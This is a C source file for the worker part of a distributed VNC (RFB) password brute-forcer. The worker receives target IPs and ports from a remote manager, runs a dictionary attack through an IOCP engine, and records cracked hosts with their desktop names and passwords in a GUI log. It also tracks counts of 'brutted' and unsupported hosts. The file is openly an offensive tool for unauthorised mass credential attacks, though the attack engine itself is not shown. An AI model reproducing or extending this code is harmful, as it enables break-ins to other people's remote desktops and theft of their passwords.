#include "includes.h"
#include <shlwapi.h>
#include <commctrl.h>
#include <stdio.h>

#include "common\settings.h"

cJSON *jsConfig;
DWORD ParseGetItemsResults(cJSON *jsItems)
{
    DWORD dwItems=cJSON_GetArraySize(jsItems),dwProcessed=0;
    for (DWORD i=0; i < dwItems; i++)
    {
        cJSON *jsItem=cJSON_GetArrayItem(jsItems,i);
        if (!jsItem)
            break;

        if (IOCP_AddAddressToBruteList((DWORD)cJSON_GetIntFromObject(jsItem,"ip"),(WORD)cJSON_GetIntFromObject(jsItem,"port"),cJSON_GetIntFromObject(jsItem,"idx")))
        {
            dwProcessed++;
            continue;
        }

        if (IOCP_IsStopped())
            break;

        DbgLog_Event(&siManager,LOG_LEVEL_WARNING,"IOCP_AddAddressToBruteList() failed, position %d/%d",i,dwItems);
        break;
    }
    return dwProcessed;
}

cJSON *GetUnsentResults()
{
    return IOCP_QueueGetUnsentResults();
}

cJSON *GetStats()
{
    cJSON *jsStats=cJSON_CreateObject();
    if (jsStats)
    {
        cJSON_AddIntToObject(jsStats,"brutted",dwBrutted);
        cJSON_AddIntToObject(jsStats,"unsupported",dwUnsupported);
        cJSON_AddIntToObject(jsStats,"not_rfb",dwNotRFB);
    }
    return jsStats;
}

static void UpdateStat(HWND hDlg,DWORD dwID,LPCWSTR lpText,DWORD dwData)
{
    WCHAR szText[MAX_PATH];
    SendDlgItemMessageW(hDlg,IDC_SBR1,SB_GETTEXTW,dwID,(LPARAM)szText);

    DWORD dwData1;
    StrToIntExW(StrChrW(szText,L' '),0,(int*)&dwData1);

    if (dwData != dwData1)
    {
        wsprintfW(szText,L"%s: %d",lpText,dwData);
        SendDlgItemMessageW(hCommonDlg,IDC_SBR1,SB_SETTEXTW,dwID,(LPARAM)szText);
    }
    return;
}

void UpdateStats()
{
    char szText[MAX_PATH];
    SendDlgItemMessageA(hCommonDlg,IDC_SBR1,SB_GETTEXTA,0,(LPARAM)szText);

    DWORD dwCurActiveTasks=0;
    sscanf(StrChrA(szText,' '),"%d/*",&dwCurActiveTasks);
    if (dwCurActiveTasks != dwActiveTasks)
    {
        wsprintfA(szText,"Active: %d/%d",dwActiveTasks,dwTotalActiveTasks);
        SendDlgItemMessageA(hCommonDlg,IDC_SBR1,SB_SETTEXTA,0,(LPARAM)szText);
    }

    UpdateStat(hCommonDlg,2,L"Unsupported",dwUnsupported);
    UpdateStat(hCommonDlg,3,L"Brutted",dwBrutted);
    return;
}

void Log_Clean()
{
    SendDlgItemMessage(hCommonDlg,IDC_FOUND_LOG,LVM_DELETEALLITEMS,NULL,NULL);
    SendDlgItemMessage(hCommonDlg,IDC_TBR1,TB_ENABLEBUTTON,IDM_CLEAN,false);
    SendDlgItemMessage(hCommonDlg,IDC_TBR1,TB_ENABLEBUTTON,IDM_DELETE,false);
    return;
}

static CRITICAL_SECTION csLog;
void Log_Append(PQUEUE_ITEM lpItem)
{
    EnterCriticalSection(&csLog);
    {
        LVITEMA lvi={0};
        lvi.mask=LVIF_TEXT;

        SYSTEMTIME st;
        GetLocalTime(&st);

        char szItem[513];
        lvi.cchTextMax=wsprintfA(szItem,"%.2d/%.2d/%.2d %.2d:%.2d:%.2d",st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond);
        lvi.pszText=szItem;
        SendDlgItemMessageA(hCommonDlg,IDC_FOUND_LOG,LVM_INSERTITEMA,NULL,(LPARAM)&lvi);

        if  (lpItem->wPort == 5900)
            lvi.cchTextMax=lstrlenA(lstrcpyA(szItem,NetNtoA(lpItem->dwIP)));
        else
            lvi.cchTextMax=wsprintfA(szItem,"%s:%d",NetNtoA(lpItem->dwIP),lpItem->wPort);

        lvi.iSubItem++;
        SendDlgItemMessageA(hCommonDlg,IDC_FOUND_LOG,LVM_SETITEMA,NULL,(LPARAM)&lvi);

        lvi.iSubItem++;
        LPCSTR lpDesktop="[empty]";
        if (lpItem->szDesktop[0])
            lpDesktop=lpItem->szDesktop;

        lvi.cchTextMax=lstrlenA(lstrcpyA(szItem,lpDesktop));
        SendDlgItemMessageA(hCommonDlg,IDC_FOUND_LOG,LVM_SETITEMA,NULL,(LPARAM)&lvi);

        lvi.iSubItem++;
        lvi.cchTextMax=wsprintfA(szItem,"%d",lpItem->dwIdx);
        SendDlgItemMessageA(hCommonDlg,IDC_FOUND_LOG,LVM_SETITEMA,NULL,(LPARAM)&lvi);

        LPCSTR lpPassword="[empty]";
        if (lpItem->szPassword[0])
            lpPassword=lpItem->szPassword;

        lvi.iSubItem++;
        lvi.cchTextMax=lstrlenA(lstrcpyA(szItem,lpPassword));
        SendDlgItemMessageA(hCommonDlg,IDC_FOUND_LOG,LVM_SETITEMA,NULL,(LPARAM)&lvi);

        SendDlgItemMessage(hCommonDlg,IDC_TBR1,TB_ENABLEBUTTON,IDM_CLEAN,true);
    }
    LeaveCriticalSection(&csLog);

    SendMessage(hCommonDlg,WM_PWD_FOUND,NULL,NULL);
    return;
}

typedef struct _LOG_COLUMN
{
    LPTSTR lpLable;
    DWORD dwCx;
} LOG_COLUMN, *PLOG_COLUMN;

static LOG_COLUMN lc[]=
{
    {_T("Time"),119},
    {_T("Address"),78},
    {_T("Desktop"),135},
    {_T("Idx"),70},
    {_T("Password"),70},
};

static cJSON *jsSettings;
void StoreDlgPos()
{
    do
    {
        if (!IsWindowVisible(hCommonDlg))
            break;

        WINDOWPLACEMENT wp;
        wp.length=sizeof(wp);

        if (!GetWindowPlacement(hCommonDlg,&wp))
            break;

        cJSON *jsDlg=cJSON_GetObjectItem(jsSettings,"worker_dlg");
        if (!jsDlg)
        {
            jsDlg=cJSON_CreateObject();
            cJSON_AddItemToObject(jsSettings,"worker_dlg",jsDlg);
        }

        Setting_ChangeValue(jsDlg,"x",wp.rcNormalPosition.left);
        Setting_ChangeValue(jsDlg,"y",wp.rcNormalPosition.top);
        Setting_ChangeValue(jsDlg,"width",wp.rcNormalPosition.right-wp.rcNormalPosition.left);
        Setting_ChangeValue(jsDlg,"height",wp.rcNormalPosition.bottom-wp.rcNormalPosition.top);

        cJSON *jsColumns=cJSON_GetObjectItem(jsSettings,"columns");
        for (DWORD i=0; i < ARRAYSIZE(lc); i++)
        {
            DWORD dwWidth=SendDlgItemMessage(hCommonDlg,IDC_FOUND_LOG,LVM_GETCOLUMNWIDTH,i,NULL);
            if (!dwWidth)
                continue;

            cJSON *jsItem=cJSON_GetArrayItem(jsColumns,i);
            if (!jsItem)
                continue;

            cJSON_SetNumberValue(jsItem,dwWidth);
        }

        Setting_ChangeValue(jsDlg,"maximized",IsZoomed(hCommonDlg));
        Setting_ChangeValue(jsDlg,"top_most",(GetWindowLong(hCommonDlg,GWL_EXSTYLE) & WS_EX_TOPMOST));

        Settings_Save(jsSettings);
    }
    while (false);
    return;
}

void InitDlg()
{
    InitializeCriticalSection(&csLog);

    cJSON *jsColumns=cJSON_GetObjectItem(jsSettings,"columns");
    if ((jsColumns) && (cJSON_GetArraySize(jsColumns) == ARRAYSIZE(lc)))
    {
        for (DWORD i=0; i < ARRAYSIZE(lc); i++)
            lc[i].dwCx=(DWORD)cJSON_GetNumberValue(cJSON_GetArrayItem(jsColumns,i));
    }
    else
    {
        cJSON_DeleteItemFromObject(jsSettings,"columns");

        jsColumns=cJSON_AddArrayToObject(jsSettings,"columns");
        for (DWORD i=0; i < ARRAYSIZE(lc); i++)
            cJSON_AddItemToArray(jsColumns,cJSON_CreateNumber(lc[i].dwCx));
    }

    HWND hList=GetDlgItem(hCommonDlg,IDC_FOUND_LOG);

    LVCOLUMN lvc={0};
    lvc.mask=LVCF_TEXT|LVCF_WIDTH;
    lvc.cchTextMax=100;
    for (DWORD i=0; i < ARRAYSIZE(lc); i++)
    {
        lvc.cx=lc[i].dwCx;
        lvc.pszText=lc[i].lpLable;
        SendMessage(hList,LVM_INSERTCOLUMN,i,(LPARAM)&lvc);
    }

    SendMessage(hList,LVM_SETEXTENDEDLISTVIEWSTYLE,0,LVS_EX_FULLROWSELECT|LVS_EX_GRIDLINES|LVS_EX_FLATSB|LVS_EX_LABELTIP|LVS_EX_DOUBLEBUFFER);
    SendMessage(hList,LVM_SETIMAGELIST,LVSIL_SMALL,(LPARAM)ImageList_Create(1,24,0,1,1));

    HWND hTB=GetDlgItem(hCommonDlg,IDC_TBR1);
    TBBUTTON tbb[]=
    {
        {1,IDM_DELETE,0,BTNS_BUTTON,0,0},
        {0,IDM_CLEAN,0,BTNS_BUTTON,0,0},
    };

    tbb[0].iString=SendMessage(hTB,TB_ADDSTRING,NULL,(LPARAM)_T("Delete item\0"));
    tbb[1].iString=SendMessage(hTB,TB_ADDSTRING,NULL,(LPARAM)_T("Clean log\0"));

    HIMAGELIST hImgList=ImageList_LoadImage(hInstance,(LPCTSTR)102,16,NULL,0xFF00FF,IMAGE_BITMAP,LR_CREATEDIBSECTION);
    SendMessage(hTB,TB_SETIMAGELIST,NULL,(LPARAM)hImgList);

    HIMAGELIST hGrayImgList=ImageList_LoadImage(hInstance,(LPCTSTR)103,16,NULL,0xFF00FF,IMAGE_BITMAP,LR_CREATEDIBSECTION);
    SendMessage(hTB,TB_SETDISABLEDIMAGELIST,NULL,(LPARAM)hGrayImgList);

    SendMessage(hTB,TB_SETMAXTEXTROWS,0,0);
    SendMessage(hTB,TB_BUTTONSTRUCTSIZE,(WPARAM)sizeof(TBBUTTON),NULL);
    SendMessage(hTB,TB_ADDBUTTONS,ARRAYSIZE(tbb),(LPARAM)tbb);
    SendMessage(hTB,TB_AUTOSIZE,NULL,NULL);

    HWND hSB=GetDlgItem(hCommonDlg,IDC_SBR1);
    int iParts[4];
    iParts[0]=iParts[1]=iParts[2]=iParts[3]=100;
    SendMessage(hSB,SB_SETPARTS,ARRAYSIZE(iParts),(LPARAM)iParts);

    SendMessageW(hSB,SB_SETTEXTW,0,(LPARAM)L"Active: 1/1");

    WCHAR szPasswordsCount[MAX_PATH],szDataFormatted[MAX_PATH];
    StrNumberFormatW(Dict_PasswordsCount(),szDataFormatted,ARRAYSIZE(szDataFormatted),L",");
    wsprintfW(szPasswordsCount,L"Passwords: %s",szDataFormatted);

    SendMessageW(hSB,SB_SETTEXTW,1,(LPARAM)szPasswordsCount);

    SendMessageW(hSB,SB_SETTEXTW,2,(LPARAM)L"Unsupported: 1");
    SendMessageW(hSB,SB_SETTEXTW,3,(LPARAM)L"Brutted: 1");

    cJSON *jsDlg=cJSON_GetObjectItem(jsSettings,"worker_dlg");
    if (jsDlg)
    {
        SetWindowPos(hCommonDlg,NULL,cJSON_GetIntFromObject(jsDlg,"x"),
                                     cJSON_GetIntFromObject(jsDlg,"y"),
                                     cJSON_GetIntFromObject(jsDlg,"width"),
                                     cJSON_GetIntFromObject(jsDlg,"height"),0);

        if (cJSON_GetIntFromObject(jsDlg,"maximized"))
            ShowWindow(hCommonDlg,SW_MAXIMIZE);

        if (cJSON_GetIntFromObject(jsDlg,"top_most"))
            PostMessage(hCommonDlg,WM_SYSCOMMAND,SYSMENU_TOPMOST_ID,NULL);
    }

    PostMessage(hCommonDlg,WM_SIZE,NULL,NULL);
    return;
}

void ResizeDlg()
{
    SendDlgItemMessage(hCommonDlg,IDC_TBR1,TB_AUTOSIZE,NULL,NULL);
    SendDlgItemMessage(hCommonDlg,IDC_SBR1,WM_SIZE,NULL,NULL);

    RECT rc;
    GetClientRect(hCommonDlg,&rc);

    MoveWindow(GetDlgItem(hCommonDlg,IDC_FOUND_LOG),0,26,rc.right,rc.bottom-46,true);

    int iParts[4];
    DWORD dwSize=rc.right/ARRAYSIZE(iParts)-5;
    iParts[0]=dwSize-20;
    iParts[1]=iParts[0]+dwSize+20;
    iParts[2]=iParts[1]+dwSize;
    iParts[3]=-1;

    SendDlgItemMessageW(hCommonDlg,IDC_SBR1,SB_SETPARTS,ARRAYSIZE(iParts),(LPARAM)iParts);
    SendDlgItemMessageW(hCommonDlg,IDC_SBR1,WM_SIZE,0,0);
    return;
}

static HANDLE hShowEvent;
static void WINAPI ShowEventWatchThread(LPVOID)
{
    while (true)
    {
        WaitForSingleObject(hShowEvent,INFINITE);
        PostMessage(hCommonDlg,WM_TRAYMSG,NULL,WM_LBUTTONUP);
    }
    return;
}

void main()
{
    do
    {
        hShowEvent=CreateEvent(NULL,false,false,_T("rfb.brute.ng.worker.show.event"));

        CreateMutex(NULL,false,_T("rfb.brute.ng.worker.protection.mutex"));
        if (GetLastError() == ERROR_ALREADY_EXISTS)
        {
            SetEvent(hShowEvent);
            break;
        }

        jsConfig=Config_Parse();
        if (!jsConfig)
            break;

        CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)ShowEventWatchThread,NULL,0,NULL);

        hInstance=GetModuleHandle(NULL);

        dwTotalActiveTasks=(DWORD)cJSON_GetIntFromObject(jsConfig,"tasks");
        if (!dwTotalActiveTasks)
            dwTotalActiveTasks=1000;

        WSADATA wsa;
        WSAStartup(MAKEWORD(2,2),&wsa);

        char szIP[100];
        WORD wPort=1050;
        sscanf(cJSON_GetStringFromObject(jsConfig,"manager"),"%[^:]:%d",szIP,&wPort);

        siManager.si.sin_family=AF_INET;
        siManager.si.sin_addr.s_addr=NetResolveAddress(szIP);
        siManager.si.sin_port=htons(wPort);

        siManager.hSock=INVALID_SOCKET;

        if (!Dict_Init(jsConfig))
            break;

        if (!IOCP_Init(jsConfig))
            break;

        SetThreadExecutionState(ES_CONTINUOUS|ES_SYSTEM_REQUIRED|ES_DISPLAY_REQUIRED);

        jsSettings=Settings_Init(jsConfig);
        DialogBoxParamW(hInstance,MAKEINTRESOURCE(IDD_DLG1),NULL,(DLGPROC)CommonDlgProc,NULL);
        IOCP_Stop();

        cJSON_Delete(jsConfig);
    }
    while (false);
    ExitProcess(0);
}

